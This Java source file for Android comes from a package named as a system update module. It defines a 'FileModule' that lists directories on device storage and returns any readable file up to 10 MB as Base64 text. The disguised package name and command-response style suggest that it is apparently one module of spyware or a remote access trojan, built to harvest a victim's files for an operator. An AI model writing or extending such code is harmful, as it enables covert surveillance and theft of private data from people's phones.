package com.android.system.update.modules;

import android.content.Context;
import android.os.Environment;
import android.util.Base64;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import org.json.JSONArray;
import org.json.JSONObject;

public class FileModule {
    private Context context;
    
    public FileModule(Context context) {
        this.context = context;
    }
    
    public String listFiles(String path) {
        try {
            File dir;
            if (path == null || path.isEmpty() || path.equals("/")) {
                dir = Environment.getExternalStorageDirectory();
            } else {
                dir = new File(path);
            }
            
            if (!dir.exists() || !dir.canRead()) {
                return "ERROR: Cannot read directory";
            }
            
            JSONArray filesList = new JSONArray();
            File[] files = dir.listFiles();
            
            if (files != null) {
                for (File file : files) {
                    JSONObject fileObj = new JSONObject();
                    fileObj.put("name", file.getName());
                    fileObj.put("path", file.getAbsolutePath());
                    fileObj.put("isDirectory", file.isDirectory());
                    fileObj.put("size", file.length());
                    fileObj.put("lastModified", file.lastModified());
                    filesList.put(fileObj);
                }
            }
            
            return filesList.toString();
        } catch (Exception e) {
            e.printStackTrace();
            return "ERROR: " + e.getMessage();
        }
    }
    
    public String getFile(String path) {
        try {
            File file = new File(path);
            if (!file.exists() || !file.canRead()) {
                return "ERROR: File not found or cannot be read";
            }
            
            if (file.length() > 10 * 1024 * 1024) { // Limit 10MB
                return "ERROR: File too large";
            }
            
            FileInputStream fis = new FileInputStream(file);
            byte[] bytes = new byte[(int) file.length()];
            fis.read(bytes);
            fis.close();
            
            return Base64.encodeToString(bytes, Base64.DEFAULT);
        } catch (Exception e) {
            e.printStackTrace();
            return "ERROR: " + e.getMessage();
        }
    }
}